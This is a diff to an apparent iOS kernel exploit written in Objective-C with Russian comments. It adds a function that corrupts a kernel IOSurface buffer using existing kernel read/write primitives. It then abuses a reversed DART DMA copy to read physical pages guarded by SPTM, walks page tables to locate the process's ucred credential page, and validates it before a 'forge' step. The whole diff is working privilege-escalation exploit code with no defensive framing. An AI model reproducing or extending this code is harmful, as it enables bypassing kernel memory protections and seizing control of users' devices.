@@ -140,6 +140,40 @@ static uint64_t kpZoneVtoP(uint64_t va)
     return 0;
 }
 
+// 1.9.252: physread 16KB через DART — swap src/dst. Запись entry[0] record
+// buffer'а пропатченной поверхности патчится на targetPA>>14, submit с
+// ОБРАТНЫМ направлением: DMA читает охраняемую страницу (deadly для CPU —
+// SPTM не смотрит на DART) и кладёт её в читаемую приёмную поверхность.
+// Рет YES = out заполнен 0x4000 байтами targetPA-страницы.
+static BOOL kpPhysRead16K(io_connect_t victim, uint64_t buf247, const uint8_t *tsdV,
+                          uint32_t srcID, uint32_t dstID, IOSurfaceRef srcS,
+                          uint64_t targetPA, uint8_t *out, NSMutableString *r)
+{
+    uint64_t tpage = targetPA & ~0x3fffULL;
+    uint64_t eSave = early_kread64(buf247 + 0x30);
+    usleep(1500);
+    early_kwrite64(buf247 + 0x30, (eSave & 0xffffffff00000000ULL) | (uint32_t)(tpage >> 14));
+    uint8_t tsdR[0x1B0];
+    memcpy(tsdR, tsdV, sizeof(tsdR));
+    *(uint32_t *)(tsdR + 0) = dstID;   // swap: пропатченная поверхность становится источником
+    *(uint32_t *)(tsdR + 4) = srcID;   // читаемая — приёмником
+    *(uint64_t *)(tsdR + 8) = 1;
+    *(uint32_t *)(tsdR + 0x0C) = 64;
+    *(uint32_t *)(tsdR + 0x10) = 64;
+    kern_return_t rkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdR, sizeof(tsdR), NULL, NULL, NULL, NULL);
+    usleep(400000);
+    early_kwrite64(buf247 + 0x30, eSave);
+    memset(out, 0, 0x4000);
+    IOSurfaceLock(srcS, 0, NULL);
+    uint8_t *spR = (uint8_t *)IOSurfaceGetBaseAddress(srcS);
+    if (spR) memcpy(out, spR, 0x4000);
+    IOSurfaceUnlock(srcS, 0, NULL);
+    uint32_t sig = *(uint32_t *)out;
+    kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] target=%#llx swap kr=0x%x sig=%#010x",
+              (unsigned long long)targetPA, rkr, sig]);
+    return spR != NULL;
+}
+
 // The EL2 domain faults in the physical aperture when read via the socket
 // primitive — PANIC. 1.9.6: the old "whole 01..02 band minus kernel image"
 // guard also blocked the libsptm PAPT table, which lives in ordinary EL1
@@ -7665,9 +7699,31 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 uint64_t pageVA = ucF & ~0x3fffULL;
                 uint32_t uoff = (uint32_t)(ucF & 0x3fff);
                 uint64_t pagePA = kvtophys(pageVA);
+                int errF = errno;
                 // 1.9.251 (р.63): walker ветки VM/RO охраняется deadly-таблицами
                 // (census 0x15) → pagePA=0. Fallback — PAPT/арена ядра (kpZoneVtoP).
                 if (!pagePA) pagePA = kpZoneVtoP(pageVA);
+                // 1.9.252: walker встал на deadly-таблице (errno 1042) — читаем её
+                // через DART-копию (kpPhysRead16K), leaf PTE сама отдаёт ucredPA.
+                if (!pagePA && errF == 1042 && kp_lastDeadlyTte && buf247 && victim != IO_OBJECT_NULL) {
+                    uint64_t tpage = kp_lastDeadlyTte & ~0x3fffULL;
+                    uint32_t tidx = (uint32_t)(kp_lastDeadlyTte & 0x3fff) / 8;
+                    uint8_t timg[0x4000];
+                    kpNote(r, [NSString stringWithFormat:@"  [FORGE] walker встал на L%d tte=%#llx — physread через DART",
+                              kp_lastDeadlyLvl, (unsigned long long)kp_lastDeadlyTte]);
+                    if (kpPhysRead16K(victim, buf247, tsdV, srcID, dstID, srcS, tpage, timg, r)) {
+                        uint64_t pte = 0; memcpy(&pte, timg + (uint64_t)tidx * 8, 8);
+                        if (kp_lastDeadlyLvl == 2 && (pte & 0x3) == 0x3) {   // L2-запись → L3 таблица
+                            uint64_t l3pa = pte & 0x0000ffffffffc000ULL;
+                            uint32_t l3idx = (uint32_t)((pageVA >> 14) & 0x7ff);
+                            kpNote(r, [NSString stringWithFormat:@"  [FORGE] L2[%u] → L3 таблица %#llx, читаю её", tidx, (unsigned long long)l3pa]);
+                            if (!kpPhysRead16K(victim, buf247, tsdV, srcID, dstID, srcS, l3pa, timg, r)) pte = 0;
+                            else memcpy(&pte, timg + (uint64_t)l3idx * 8, 8);
+                        }
+                        kpNote(r, [NSString stringWithFormat:@"  [FORGE] leaf PTE = %#018llx", pte]);
+                        if ((pte & 0x3) == 0x3) pagePA = pte & 0x0000ffffffffc000ULL;
+                    }
+                }
                 // ДВЕ валидации PA перед любой записью: (1) phystokv(pagePA) читается
                 // и первый qword совпадает с [pageVA]; (2) uid-поле == getuid().
                 uint64_t pkva = pagePA ? phystokv(pagePA) : 0;
@@ -7675,6 +7731,19 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 uint64_t q0b = early_kread64(pageVA);
                 uint32_t uidViaPA = pkva ? (uint32_t)early_kread64(pkva + uoff + 0x18) : 0xdead;
                 BOOL paOK = (q0a == q0b) && (uidViaPA == (uint32_t)getuid());
+                // 1.9.252: кросс-валидация через DART-read, если physmap-алиас ucred
+                // страницы сам охраняется (pkva=0 или q0a не сошёлся).
+                if (!paOK && pagePA && buf247 && victim != IO_OBJECT_NULL) {
+                    uint8_t cimg[0x4000];
+                    if (kpPhysRead16K(victim, buf247, tsdV, srcID, dstID, srcS, pagePA, cimg, r)) {
+                        uint64_t q0c = 0; memcpy(&q0c, cimg, 8);
+                        uint32_t uidViaC = 0; memcpy(&uidViaC, cimg + uoff + 0x18, 4);
+                        if (q0c == q0b && uidViaC == (uint32_t)getuid()) {
+                            paOK = YES;
+                            kpNote(r, @"  [FORGE] валидация через DART-read: СОШЛАСЬ (physmap-алиас не нужен)");
+                        }
+                    }
+                }
                 kpNote(r, [NSString stringWithFormat:@"  [FORGE] pageVA=%#llx pagePA=%#llx uoff=%#x — валидация PA: %@",
                           (unsigned long long)pageVA, (unsigned long long)pagePA, uoff, paOK ? @"СОШЛАСЬ" : @"НЕ СОШЛАСЬ — записи не будет"]);
                 // 1.9.251: форжим ВСЮ 16KB-страницу — ucred сидит на uoff=0x38b0,
